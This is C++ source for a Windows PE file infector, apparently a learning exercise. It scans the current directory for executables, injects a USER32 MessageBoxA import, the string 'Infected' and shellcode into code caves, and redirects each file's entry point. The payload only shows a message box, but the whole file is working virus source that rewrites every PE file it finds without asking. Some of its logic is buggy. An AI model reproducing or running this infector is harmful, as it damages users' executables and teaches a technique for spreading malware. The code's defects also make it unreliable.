#include <iostream>
#include <cstdio>
#include <stdio.h>
#include <cstdio>
#include <stdlib.h> 
#include <conio.h> 
#include <string.h>
#include <unistd.h>
#include <dirent.h>

using namespace std;


char getCharFromOffset(FILE* file, long offset, int fromIndex);
double getQWORDFromOffset(FILE* file, long offset, int fromIndex);
short getWORDFromOffset(FILE* file, long offset, int fromIndex);
long getDWORDFromOffset(FILE* file, long offset, int fromIndex);
long getDWORDInArray(char* raw,int fromIndex);
long getPEOffset(FILE* file);
long getSectionOffset(FILE* file);
long getPointerToEntyPoint(FILE* file);
long getImageBase(FILE* file);
long getFileAlignment(FILE* file);
long getSizeOfImage(FILE* file);
short getNumOfSections(FILE* file);
char** getRawSectionTable(FILE* file, short numOfSections);
double getSectionNameFromRaw(char* raw);
long getVirtualSize(char* raw);
long getVirtualAddress(char* raw);
long getRawSize(char* raw);
long getRawOffset(char* raw);
long getCharacteristics(char* raw);
long getRVAImport(FILE* file);
long getRVAExport(FILE* file);
int getNumberOfImportDes(FILE* file,long RawOffsetImport);
int isEndOfImportDes(char des[]);
char** getPackOfImportDescriptor(FILE* file,long RawOffsetImport);
long getCaveSize(char* sectionRaw);
long getCaveRawOffset(char* sectionRaw);
long getRVAFromElements(long rawOffset, long rawOffsetOfSection, long VirtualOffsetOfSection, long imageBase);
char** getNewPackOfIID(char** oldIID,long RVAOfAddedThunkData, long RVAOfAddedDllName, int numOfDes );
void addAPIToCave(FILE* file,long addOffset);
void addStringToCave(FILE* file,long addOffset);
void AddRVAFuntionNameToAddedThunkData(FILE* file, long rawOffsetOfThunkData , long RVAOfFunctionName);
long getRawOffsetOfImport(FILE* file, char** sectionTable);
void addnewIIDToCave(FILE* file, char** newIID, long offsetToAdd, int numOfDes);
void addAPINameToCave(FILE* file, long rawOffsetDLL, long rawOffsetFunction);
void addCodeToCave(FILE* file, long rawOffsetOfAddedCode, long RVAOfThunkData, long RVAOfText);
void changeInfoOfProgram(FILE* file,long RVAOfNewIID, long RVAOfCode );	
char** getPEFilePath();
int getNumOfFile();
int isPEFile(FILE*file);

main(){
	
//	char cwd[1024];
//    getcwd(cwd, sizeof(cwd));
    
	char **list = getPEFilePath();
	
	for(int i=0; i< getNumOfFile(); i++){
		FILE* file;
		file = fopen(list[i],"rb+");
		
	
//	char * x = "\xab\x64\x0e\x17\x45\xb2\xc7\x8a";
//	fwrite(x,sizeof(char)*3,1,file);

		char** sectionTable = getRawSectionTable(file, getNumOfSections(file));
		char** oldIID = getPackOfImportDescriptor(file, getRawOffsetOfImport(file,sectionTable));
		long caveOffset2 = getCaveRawOffset(sectionTable[1]);
		long rawOffsetOfAddedThunkData = caveOffset2;
		long rawOffsetOfAddedFunctionName = rawOffsetOfAddedThunkData + 8;
		long rawOffsetOfAddedDLLName = rawOffsetOfAddedFunctionName + 32;
		long rawOffsetOfNewIID = rawOffsetOfAddedDLLName + 24;
		
		long RVAOfAddedThunkData = getRVAFromElements(rawOffsetOfAddedThunkData, getRawOffset(sectionTable[1]),getVirtualAddress(sectionTable[1]),0);
		long RVAOfNewIID = getRVAFromElements(rawOffsetOfNewIID, getRawOffset(sectionTable[1]),getVirtualAddress(sectionTable[1]),0);
		long RVAOfAddedFunctionName = getRVAFromElements(rawOffsetOfAddedFunctionName, getRawOffset(sectionTable[1]),getVirtualAddress(sectionTable[1]),0);
		long RVAOfAddedDLLName = getRVAFromElements(rawOffsetOfAddedDLLName, getRawOffset(sectionTable[1]),getVirtualAddress(sectionTable[1]),0);
		AddRVAFuntionNameToAddedThunkData(file, rawOffsetOfAddedThunkData, RVAOfAddedFunctionName);
		int numOfDes = getNumberOfImportDes(file, getRawOffsetOfImport(file,sectionTable));
		char** newIID = getNewPackOfIID(oldIID,RVAOfAddedThunkData,RVAOfAddedDLLName, numOfDes );
		
		addAPINameToCave(file, rawOffsetOfAddedDLLName, rawOffsetOfAddedFunctionName);
		addnewIIDToCave(file, newIID, rawOffsetOfNewIID ,numOfDes);
		
	//	printf("caveOffset: %x\n", caveOffset2);
	//	printf("ThunkData: %x\n", rawOffsetOfAddedThunkData);
	//	printf("FunctionName: %x\n", rawOffsetOfAddedFunctionName);
	//	printf("Des: %x\n", rawOffsetOfAddedDLLName+16);
		long caveOffset = getCaveRawOffset(sectionTable[0]);
		
		long rawOffsetOfAddedText = caveOffset;
		long rawOffsetOfAddedCode = caveOffset + 16 ;
		long RVAOfText = getRVAFromElements(rawOffsetOfAddedText,getRawOffset(sectionTable[0]),getVirtualAddress(sectionTable[0]),getImageBase(file));
		long RVAOfCode = getRVAFromElements(rawOffsetOfAddedCode,getRawOffset(sectionTable[0]),getVirtualAddress(sectionTable[0]),0);
		addStringToCave(file,caveOffset);
	//	printf("RVA Text: %x", RVAOfText);
		addCodeToCave(file, rawOffsetOfAddedCode, RVAOfAddedThunkData, RVAOfText );
			
		changeInfoOfProgram(file,RVAOfNewIID, RVAOfCode );	
			
			
		for(int i = 0; i<getNumOfSections(file); i++){
			delete []sectionTable[i];
		}	   
		delete []sectionTable;
			
		for(int i = 0; i<numOfDes; i++){
			delete []oldIID[i];
		}	   
		delete []oldIID;
		
		for(int i = 0; i<numOfDes+2; i++){
			delete []newIID[i];
		}	   
		delete []newIID;	
	}
	cout << "================ DONE ================" << endl;
	getch();
	
}

//============================================================================================================================================================================================================================================================================================

void changeInfoOfProgram(FILE* file,long RVAOfNewIID, long RVAOfCode ){
//	long rawOffsetIID = getRVAImport(file);
	char buff[5]="x";
	memcpy(&buff,&RVAOfNewIID, 4);
	rewind(file);
	fseek(file,getPEOffset(file)+128,SEEK_SET);
	fwrite(buff, sizeof(char)*4,1,file);
	
	memcpy(&buff,&RVAOfCode, 4);
	rewind(file);
	fseek(file,getPEOffset(file)+40,SEEK_SET);
	fwrite(buff, sizeof(char)*4,1,file);
	

	
}

void addCodeToCave(FILE* file, long rawOffsetOfAddedCode, long RVAOfThunkData, long RVAOfText){
	char code[30] = "\x6A\x00\x68----\x68----\x6A\x00\xFF\x15----\xB8----\xFF\xE0";
	RVAOfThunkData += getImageBase(file);
	long oldEP = getPointerToEntyPoint(file)+ getImageBase(file);
	rewind(file);
	long* pointer= &RVAOfText;
	long* pointerThunk= &RVAOfThunkData;
	long* pointerOldEP = &oldEP;
	for(int i=0; i<4; i++){
		code[3+i] =  *( ((char*) pointer) + i );
		code[8+i] =  *( ((char*) pointer) + i );	
		code[16+i]=	 *( ((char*) pointerThunk) + i );	
		code[21+i]=	 *( ((char*) pointerOldEP) + i );	
	}
	rewind(file);
	fseek(file, rawOffsetOfAddedCode, SEEK_SET);
	fwrite(code, sizeof(char)*30, 1, file);
}

void addAPINameToCave(FILE* file, long rawOffsetDLL, long rawOffsetFunction){
	rewind(file);
	fseek(file, rawOffsetDLL, SEEK_SET);
	fwrite("USER32.dll\x0\x0\x0\x0", sizeof(char)*24,1,file);
	fseek(file, rawOffsetFunction, SEEK_SET);
	fwrite("\x0\x0\MessageBoxA\x0\x0\x0\x0\x0\x0\x0\x0", sizeof(char)*24,1,file);
}

void addnewIIDToCave(FILE* file, char** newIID, long offsetToAdd, int numOfDes){
//	printf("Offset to add: %x", offsetToAdd);
	rewind(file);
	fseek(file, offsetToAdd, SEEK_SET);
	for(int i=0; i< numOfDes+2; i++){
		//for(int j=0; j<20;j++){
			fwrite(newIID[i],sizeof(char)*20,1,file);
	//	}
	}
}

void AddRVAFuntionNameToAddedThunkData(FILE* file,long rawOffsetOfThunkData , long RVAOfFunctionName){
	char x[4]="aa";
//	memcpy(&x,&RVAOfFunctionName,4);
	long* pointer = &RVAOfFunctionName;
	for(int i=0; i< 4;i++){
//		newPack[size-2][12+i]= (RVAOfAddedThunkData & 0XFF);
// 		RVAOfAddedThunkData = (RVAOfAddedThunkData >>8);
       x[i] =  *( ((char*) pointer) + i );
    
	}
//	printf("%x ", x[1]);
	rewind(file);
	fseek(file,rawOffsetOfThunkData,SEEK_SET);
	fwrite(x, sizeof(char)*4, 1, file);
}

void addStringToCave(FILE* file,long addOffset){
	char text[16]="Infected";
	rewind(file);
	fseek(file,addOffset,SEEK_SET);
	fwrite(text, sizeof(char)*16, 1, file);
}

void addAPIToCave(FILE* file,long addOffset){
	char API[12] = "MessageBoxA";
	char DLL[11] = "USER32.dll";
	rewind(file);
	fseek(file,addOffset,SEEK_SET);
	fwrite(API, sizeof(char)*12, 1, file);
	fseek(file,addOffset+16, SEEK_SET);
	fwrite(DLL, sizeof(char)*11, 1, file);
	
}

long getRVAFromElements(long rawOffset, long rawOffsetOfSection, long VirtualOffsetOfSection, long imageBase){
	return rawOffset - rawOffsetOfSection + VirtualOffsetOfSection + imageBase;
	
}

char** getNewPackOfIID(char** oldIID,long RVAOfAddedThunkData, long RVAOfAddedDllName, int numOfDes ){
	int size = numOfDes +2;

	char **newPack = new char*[size];
    int i=0;
	for(i=0;i<size;i++){
		newPack[i] = new char[20];
	}
	for( i = 0; i<size-2; i++){
		newPack[i]=oldIID[i];
	}
	for( i=0; i< 12; i++){
		newPack[size-2][i]='\0';
	}
	
//	memcpy(&newPack[size-2]+12,&RVAOfAddedDllName,4);
//	memcpy(&newPack[size-2]+16,&RVAOfAddedThunkData,4);
	long* pointerDLL = &RVAOfAddedDllName;
	long* pointerThunk = &RVAOfAddedThunkData;
	for(int i=0; i< 4;i++){
//		newPack[size-2][12+i]= (RVAOfAddedThunkData & 0XFF);
// 		RVAOfAddedThunkData = (RVAOfAddedThunkData >>8);
       newPack[size-2][12+i] =  *( ((char*) pointerDLL) + i );
       newPack[size-2][16+i] =  *( ((char*) pointerThunk) + i );
//		printf("%x---",newPack[size-2][16+i])  ;
	}
	for(int i = 0; i<20; i++){
		newPack[size-1][i]='\0';
	}
	return newPack;
}

long getCaveRawOffset(char* sectionRaw){
//	printf("Virtual: %x\n", getVirtualSize(sectionRaw));
//	printf("Raw: %x\n", getRawOffset(sectionRaw));
	return getRawOffset(sectionRaw) + getVirtualSize(sectionRaw) + 8;//8 la so tuy chon de du ra
}

long getCaveSize(char* sectionRaw){
	return getRawSize(sectionRaw)- getVirtualSize(sectionRaw);
}

long getRawOffsetOfImport(FILE* file, char** raw){
	long RawOffsetImport;
	for(int i=0; i< getNumOfSections(file); i++ ){
		if( getRVAImport(file) >= getVirtualAddress(raw[i]) && getRVAImport(file) < getVirtualAddress(raw[i]) + getRawSize(raw[i]) ){ // tim RawOffset tu RVA
	
		int temp;
		temp = getRVAImport(file) - getVirtualAddress(raw[i]);
		RawOffsetImport = getRawOffset(raw[i]) + temp;
	//	diff=RawOffsetImport- getRVAImport(file);
	//	RawOffsetImport = getRVAImport(file) - diff ;
	//	printf("Triggered: %x\n",RawOffsetImport);
		}
	}
	return RawOffsetImport;
}

char** getPackOfImportDescriptor(FILE* file,long RawOffsetImport){
	int numOfDes= getNumberOfImportDes(file,RawOffsetImport);
	char **pack = new char*[numOfDes];
	for(int i=0;i<numOfDes;i++){
		pack[i] = new char[20];
	}
	fseek(file,RawOffsetImport,SEEK_SET);
	for(int j=0;j<numOfDes;j++){
		fread(pack[j],20,1,file);
	}
	return pack;
}

int isEndOfImportDes(char des[]){
	for(int i = 0; i<20; i++){
		if (des[i]!=0){
		return 0;
		}
	}	
	return 1;
}

int getNumberOfImportDes(FILE* file, long RawOffsetImport){
	int rs = 0;
	char buff[20]="a";
	long offset= RawOffsetImport;
	
	do{	
	fseek(file, offset, SEEK_SET);
	fread(buff,20,1,file);
	offset+=20;
	rs++;
	
	}while(!isEndOfImportDes(buff))	;
	
	return rs-1;
}

char** getRawSectionTable(FILE* file, short numOfSections){
	int i=0; 
	char **RawSectionTable = new char*[numOfSections];
	for(int j=0;j<numOfSections; j++){
		RawSectionTable[j]= new char[40];
	}
	fseek(file, getSectionOffset(file),SEEK_SET);
	
	for(i=0;i<numOfSections; i++){
		//	cout << "xxx";
		fread(RawSectionTable[i],40,1,file);
	}
		
//	fread(RawSectionTable[0],sizeof(RawSectionTable[0]),1,file);
//	cout <<"ccc  "<< sizeof(RawSectionTable) << "     ghjghjg";
	return RawSectionTable;
}

double getSectionNameFromRaw(char* raw){
	double name;
	memcpy(&name, &raw, 8);
	return name;
}

long getVirtualSize(char* raw){
	return getDWORDInArray(raw,8);
}

long getVirtualAddress(char* raw){
	return getDWORDInArray(raw,12);
}

long getRawSize(char* raw){
	return getDWORDInArray(raw,16);
}

long getRawOffset(char* raw){
	return getDWORDInArray(raw,20);
}

long getCharacteristics(char* raw){
	return getDWORDInArray(raw,36);
}

long getDWORDInArray(char* raw,int fromIndex){
	char buff[4];
	long rs;
	int j = fromIndex;
	for(int i=0; i<4;i++){
		buff[i]=raw[j];
//		cout << "+++" <<buff[i];
		j++;
	}
//	rs = strtol(buff,NULL,10);
	

long* pointer = &rs;

	memcpy(&rs,&buff,4);
//	for (int h = 0; h < sizeof(long); h++) {
//    char thisbyte = *( ((char*) pointer) + h );
//    printf("%x ",thisbyte);}
	
	return rs;	
}

short getNumOfSections(FILE* file){
	return getWORDFromOffset(file,getPEOffset(file),6);
}

long getPointerToEntyPoint(FILE* file){
	return getDWORDFromOffset(file,getPEOffset(file),40);
}

long getImageBase(FILE* file){
	rewind(file);
	unsigned char buff[64];
	long ImageBaseLong;
	unsigned char ImageBaseArray[4];
	fseek(file, getPEOffset(file),SEEK_SET);
	fread(buff,sizeof(buff),1,file);
	int j=52;
	for(int i=0;i<4;i++){
		ImageBaseArray[i]=buff[j];
		j++;
	}
	
	memcpy(&ImageBaseLong,&ImageBaseArray,4);
	return ImageBaseLong;
}

long getFileAlignment(FILE* file){
	return getDWORDFromOffset(file,getPEOffset(file),60);
}

long getSizeOfImage(FILE* file){
	return getDWORDFromOffset(file,getPEOffset(file),80);
}

long getRVAImport(FILE* file){
	return getDWORDFromOffset(file,getPEOffset(file),128);
}

long getRVAExport(FILE* file){
	return getDWORDFromOffset(file,getPEOffset(file),120);
}

short getWORDFromOffset(FILE* file, long offset, int fromIndex){
	rewind(file);
	unsigned char buff[224];
	short shortVal;
	unsigned char array[4];
	fseek(file, offset,SEEK_SET);
	fread(buff,sizeof(buff),1,file);
	int j=fromIndex;
	for(int i=0;i<2;i++){
		array[i]=buff[j];
		j++;
	}
	
	memcpy(&shortVal,&array,4);
	return shortVal;	
}

long getDWORDFromOffset(FILE* file, long offset, int fromIndex){
	rewind(file);
	unsigned char buff[224];
	long longVal;
	unsigned char array[4];
	fseek(file, offset,SEEK_SET);
	fread(buff,sizeof(buff),1,file);
	int j=fromIndex;
	for(int i=0;i<4;i++){
		array[i]=buff[j];
		j++;
	}
	
	memcpy(&longVal,&array,4);
	return longVal;
}

double getQWORDFromOffset(FILE* file, long offset, int fromIndex){
	rewind(file);
	unsigned char buff[224];
	long longVal;
	unsigned char array[8];
	fseek(file, offset,SEEK_SET);
	fread(buff,sizeof(buff),1,file);
	int j=fromIndex;
	for(int i=0;i<8;i++){
		array[i]=buff[j];
		j++;
	}
	
	memcpy(&longVal,&array,4);
	return longVal;
}

char getCharFromOffset(FILE* file, long offset, int fromIndex){
	rewind(file);
	unsigned char buff[224];
	char rs;
	unsigned char array[8];
	fseek(file, offset,SEEK_SET);
	fread(array,sizeof(rs),1,file);
	rs=array[0];	
//	memcpy(&longVal,&array,4);
	return rs;
}

long getPEOffset(FILE* file){
	rewind(file);
	unsigned char buff[64];
	unsigned char revs[4];
	fread(buff,sizeof(buff),1,file);
	revs[0]=buff[60];
	revs[1]=buff[61];
	revs[2]=buff[62];
	revs[3]=buff[63];
	long x;
	

	memcpy(&x, &revs, 4);
	

	return x;
}

long getSectionOffset(FILE* file){
	
	return getPEOffset(file)+248;

}

char** getPEFilePath(){
	char cwd[1024];
	char* name= new char[100];
    name = getcwd(cwd, sizeof(cwd));
	char **list = new char*[200];
    int i=0;
	for(i=0;i<200;i++){
		list[i] = new char[50];
	}
    DIR *d;
    struct dirent *dir;
    d = opendir(name);
    if (d)
    {
    	int i = 0;
        while ((dir = readdir(d)) != NULL)
        {
           // printf("%s\n", dir->d_name);
           char* buff;
           strncpy(list[i],dir->d_name,30);
        	
        	char *path = new char[100];
        	strcpy(path,"./");
   			strcat(path,dir->d_name);
   			
        	FILE* file ;
			file = fopen(path,"rb+");
			if(isPEFile(file)==1){
					strncpy(list[i],path,50);
			}

            i++;
        }
        closedir(d);
    }
    return list;
}

int getNumOfFile(){
	int k =0;
	char cwd[1024];
	char* name= new char[100];
    name = getcwd(cwd, sizeof(cwd));
    char **list = new char*[200];
    int i=0;
	for(i=0;i<200;i++){
		list[i] = new char[50];
	}
    DIR *d;
    struct dirent *dir;
    d = opendir(name);
    if (d)
    {
    	
    	int i = 0;
        while ((dir = readdir(d)) != NULL)
        {
           // printf("%s\n", dir->d_name);
           char* buff;
           strncpy(list[i],dir->d_name,30);
        	
        	char *path = new char[100];
        	strcpy(path,"./");
   			strcat(path,dir->d_name);
   			
        	FILE* file ;
			file = fopen(path,"rb+");
			if(isPEFile(file)==1){
					k++;
			}

            i++;
        }
        closedir(d);
    }
    return k;
}

int isPEFile(FILE*file){
	char buff[3]="x";
	rewind(file);
	fseek(file,0,SEEK_SET);
	fread(buff,sizeof(buff),1,file);
	if(buff[0]=='M' && buff[1]=='Z'){
		return 1;
	}
	return 0 ;
}
